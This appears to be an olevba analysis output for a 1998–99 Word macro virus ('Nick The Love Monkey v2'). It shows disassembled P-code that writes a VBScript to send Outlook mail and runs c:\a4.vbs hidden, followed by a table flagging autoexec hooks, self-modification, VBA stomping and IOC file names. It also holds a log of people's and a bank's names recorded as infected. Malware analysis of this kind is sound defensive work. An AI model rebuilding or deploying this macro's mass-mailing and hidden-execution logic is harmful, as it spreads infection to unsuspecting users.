' Line #123:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0038 "Set theApp = WScript.CreateObject("Outlook.Application")"
' 	PrintItemNL 
' Line #124:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002E "Set theNameSpace = theApp.GetNameSpace("MAPI")"
' 	PrintItemNL 
' Line #125:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0028 "theNameSpace.Logon "profile", "password""
' 	PrintItemNL 
' Line #126:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0026 "Set theMailItem = theApp.CreateItem(0)"
' 	PrintItemNL 
' Line #127:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0021 "theMailItem.Recipients.Add EMADDY"
' 	PrintItemNL 
' Line #128:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0022 "theMailItem.Subject = BOB.Username"
' 	PrintItemNL 
' Line #129:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 "theMailItem.Body = MSGBDY"
' 	PrintItemNL 
' Line #130:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "theMailItem.Send"
' 	PrintItemNL 
' Line #131:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "theNameSpace.Logoff"
' 	PrintItemNL 
' Line #132:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "Next"
' 	PrintItemNL 
' Line #133:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #134:
' 	EndIfBlock 
' Line #135:
' 	LitStr 0x0011 "wscript c:\a4.vbs"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #136:
' 	EndIfBlock 
' Line #137:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Ld a 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld a 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	EndIf 
' Line #138:
' 	QuoteRem 0x0000 0x005E " Nick "The Love Monkey" v2 Virus Package by ALT-F4 and ALT-F11 for the Alternative Virus Mafia"
' Line #139:
' 	QuoteRem 0x0000 0x0039 "Hugh G. Rection Loves Nicky F. Also! 11/14/98 10:56:30 AM"
' Line #140:
' 	QuoteRem 0x0000 0x0036 "Sylvio Proulx Loves Nicky F. Also! 11/23/98 8:45:13 PM"
' Line #141:
' 	QuoteRem 0x0000 0x002A "yosh Loves Nicky F. Also! 11/12/98 7:03:01"
' Line #142:
' 	QuoteRem 0x0000 0x002C "MOONEY Loves Nicky F. Also! 1/03/99 19:35:22"
' Line #143:
' 	EndSub 
' Line #144:
' 	FuncDefn (Private Sub Document_New())
' Line #145:
' Line #146:
' 	QuoteRem 0x0000 0x0032 "BoormaG Loves Nicky F. Also! 15/03/1999 7:38:47 AM"
' Line #147:
' 	QuoteRem 0x0000 0x0032 "RossitD Loves Nicky F. Also! 16/03/1999 9:51:33 AM"
' Line #148:
' 	QuoteRem 0x0000 0x0037 "Therese Rusell Loves Nicky F. Also! 16/03/1999 15:46:29"
' Line #149:
' 	QuoteRem 0x0000 0x0032 "SmithDi Loves Nicky F. Also! 18/03/1999 8:47:59 AM"
' Line #150:
' 	QuoteRem 0x0000 0x0032 "KearnsB Loves Nicky F. Also! 13/04/1999 2:29:45 PM"
' Line #151:
' 	QuoteRem 0x0000 0x002C "DunneJ Loves Nicky F. Also! 19/04/99 8:48:09"
' Line #152:
' 	QuoteRem 0x0000 0x0034 "Anthony Gao Loves Nicky F. Also! 28/04/1999 15:15:56"
' Line #153:
' 	QuoteRem 0x0000 0x0030 "U004006 Loves Nicky F. Also! 30/04/1999 15:07:51"
' Line #154:
' 	QuoteRem 0x0000 0x0044 "Westpac Banking Corporation Loves Nicky F. Also! 06/05/1999 13:29:30"
' Line #155:
' 	QuoteRem 0x0000 0x002B "WBC Loves Nicky F. Also! 07/05/1999 8:14:06"
' Line #156:
' 	QuoteRem 0x0000 0x0036 "Sharon Hawkins Loves Nicky F. Also! 20/05/1999 9:33:10"
' Line #157:
' 	QuoteRem 0x0000 0x0035 "Markus Schmall Loves Nicky F. Also! 6/4/99 2:59:06 PM"
' Line #158:
' 	QuoteRem 0x0000 0x0030 "MACRO Loves Nicky F. Also! 10/19/2099 6:22:17 PM"
' Line #159:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|Suspicious|Environment         |May read system environment variables        |
|Suspicious|ExpandEnvironmentStr|May read system environment variables        |
|          |ings                |                                             |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Wscript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |happy.vbs           |Executable file name                         |
|IOC       |avm.vbs             |Executable file name                         |
|IOC       |A4.vbs              |Executable file name                         |
|IOC       |a4.vbs              |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

